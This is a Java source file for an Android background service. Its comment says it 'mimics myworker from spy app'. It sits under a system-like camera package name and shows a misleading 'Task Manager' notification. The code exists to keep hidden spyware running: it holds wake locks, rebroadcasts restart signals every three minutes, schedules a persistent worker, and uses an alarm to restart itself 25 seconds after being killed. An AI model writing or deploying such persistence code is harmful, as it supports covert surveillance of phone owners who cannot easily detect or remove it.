package com.android.photo.camera.capture;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.util.Log;

import java.lang.ref.WeakReference;

/**
 * MyWorkerService - mimics myworker from spy app
 * Handles general tasks and work management
 */
public class MyWorkerService extends Service {
    private static final String TAG = "MyWorkerService";
    private PowerManager.WakeLock wakeLock;
    private Handler handler;
    private static final long CHECK_INTERVAL = 180 * 1000; // 3 minutes
    private static final long RESTART_INTERVAL = 25 * 1000; // 25 seconds
    private boolean isDestroyed = false; // Flag to track service destruction

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "MyWorkerService created");

        // Start in foreground with notification
        ForegroundServiceHelper.startForeground(this, 1007,
                "Task Manager", "Managing system tasks");

        // Create handler for periodic tasks
        handler = new Handler(Looper.getMainLooper());

        // Acquire wake lock
        acquireWakeLock();

        // Start work management
        startWorkManagement();
    }

    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
            wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "MyWorkerService::WakeLockTag"
            );
            wakeLock.acquire(15 * 60 * 1000L); // 15 minutes timeout
        } catch (Exception e) {
            Log.e(TAG, "Error acquiring wake lock", e);
        }
    }

    private void startWorkManagement() {
        // Start periodic work management
        WorkManagementRunnable runnable = new WorkManagementRunnable(this);
        handler.postDelayed(runnable, CHECK_INTERVAL);
    }

    /** Schedules the next check if the service is still active */
    private void scheduleNextCheck(Runnable runnable) {
        if (handler != null && !isDestroyed) {
            handler.postDelayed(runnable, CHECK_INTERVAL);
        }
    }

    private void manageWork() {
        if (isDestroyed) {
            Log.w(TAG, "Service is destroyed, skipping manageWork");
            return;
        }
        Log.d(TAG, "Managing work...");

        // Trigger SensorRestarterBroadcastReceiver
        Intent restartIntent = new Intent("RestartSensor");
        sendBroadcast(restartIntent);

        // Trigger service check in main receiver
        Intent checkIntent = new Intent(this, MyReceiver.class);
        checkIntent.setAction("CHECK_SERVICES");
        sendBroadcast(checkIntent);

        // Request next work schedule
        androidx.work.WorkManager.getInstance(this)
                .enqueueUniqueWork(
                        "essential_work",
                        androidx.work.ExistingWorkPolicy.REPLACE,
                        new androidx.work.OneTimeWorkRequest.Builder(PersistentWorker.class)
                                .setInitialDelay(30, java.util.concurrent.TimeUnit.MINUTES)
                                .build()
                );
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "MyWorkerService started");

        // Ensure we're running in foreground if restarted
        ForegroundServiceHelper.startForeground(this, 1007,
                "Task Manager", "Managing system tasks");

        // Manage work on start
        manageWork();

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "MyWorkerService destroyed");
        isDestroyed = true; // Mark service as destroyed

        // Release wake lock if still held
        if (wakeLock != null && wakeLock.isHeld()) {
            try {
                wakeLock.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing wake lock", e);
            }
        }

        // Remove callbacks
        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
        }

        // Schedule restart
        scheduleRestart();
    }

    private void scheduleRestart() {
        try {
            // Schedule service restart using AlarmManager
            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            Intent intent = new Intent(this, MyWorkerService.class);

            PendingIntent pendingIntent = PendingIntent.getService(
                    this,
                    1005,
                    intent,
                    PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
            );

            if (alarmManager != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    alarmManager.setExactAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP,
                            SystemClock.elapsedRealtime() + RESTART_INTERVAL,
                            pendingIntent
                    );
                } else {
                    alarmManager.setExact(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP,
                            SystemClock.elapsedRealtime() + RESTART_INTERVAL,
                            pendingIntent
                    );
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error scheduling restart", e);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    /** Static inner class to handle periodic work management */
    private static class WorkManagementRunnable implements Runnable {
        private final WeakReference<MyWorkerService> serviceRef;

        WorkManagementRunnable(MyWorkerService service) {
            this.serviceRef = new WeakReference<>(service);
        }

        @Override
        public void run() {
            MyWorkerService service = serviceRef.get();
            if (service != null && !service.isDestroyed) {
                service.manageWork();
                service.scheduleNextCheck(this);
            } else {
                Log.w(TAG, "Service is null or destroyed, skipping execution");
            }
        }
    }
}